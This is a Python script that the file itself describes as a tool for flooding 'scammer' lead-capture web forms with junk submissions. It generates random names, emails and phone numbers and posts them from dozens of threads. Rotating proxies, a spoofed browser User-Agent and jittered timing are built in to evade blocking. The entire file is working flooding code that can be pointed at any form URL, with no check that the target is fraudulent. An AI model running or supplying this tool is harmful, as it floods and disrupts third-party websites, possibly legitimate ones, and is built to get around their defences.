"""Floods scammer lead-capture forms with garbage submissions."""
from __future__ import annotations

import random
import string
import threading
import time

import requests
from requests.adapters import HTTPAdapter


def _rand_phone() -> str:
    return "+91" + "".join(random.choices(string.digits, k=10))


def _rand_email() -> str:
    return "".join(random.choices(string.ascii_lowercase, k=12)) + "@" + random.choice(
        ["gmail.com", "yahoo.com", "outlook.com", "tempmail.co"])


def _rand_name() -> str:
    return "".join(random.choices(string.ascii_letters, k=8))


class FormFlooder:
    def __init__(self, form_url: str, fields: dict[str, str] | None = None,
                 proxies: list[str] | None = None):
        self.url = form_url
        self.fields = fields or {
            "name": "", "email": "", "phone": "",
            "message": "", "subject": "Inquiry",
        }
        self.proxies = proxies or []
        self.stats = {"sent": 0, "failed": 0, "locked": False}
        self._lock = threading.Lock()

    def _payload(self) -> dict[str, str]:
        out = dict(self.fields)
        for k in out:
            if k in ("name",):
                out[k] = _rand_name()
            elif k in ("email",):
                out[k] = _rand_email()
            elif k in ("phone", "mobile", "contact"):
                out[k] = _rand_phone()
            elif k in ("message", "comment", "note"):
                out[k] = "".join(random.choices(string.ascii_letters + " ", k=120))
            else:
                out[k] = _rand_name()
        return out

    def _session(self) -> requests.Session:
        s = requests.Session()
        adapter = HTTPAdapter(pool_connections=4, pool_maxsize=8)
        s.mount("http://", adapter); s.mount("https://", adapter)
        if self.proxies:
            p = random.choice(self.proxies)
            s.proxies = {"http": p, "https": p}
        s.headers["User-Agent"] = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/124.0 Safari/537.36"
        )
        return s

    def _submit(self) -> bool:
        try:
            s = self._session()
            r = s.post(self.url, data=self._payload(), timeout=10)
            ok = 200 <= r.status_code < 400
        except Exception:
            ok = False
        with self._lock:
            self.stats["sent" if ok else "failed"] += 1
        return ok

    def run(self, workers: int = 30, duration: int = 60, delay: float = 0.1) -> dict:
        deadline = time.time() + duration
        def worker():
            while time.time() < deadline and not self.stats["locked"]:
                self._submit()
                time.sleep(delay + random.uniform(0, delay))
        ts = [threading.Thread(target=worker, daemon=True) for _ in range(workers)]
        for t in ts: t.start()
        for t in ts: t.join()
        return dict(self.stats)
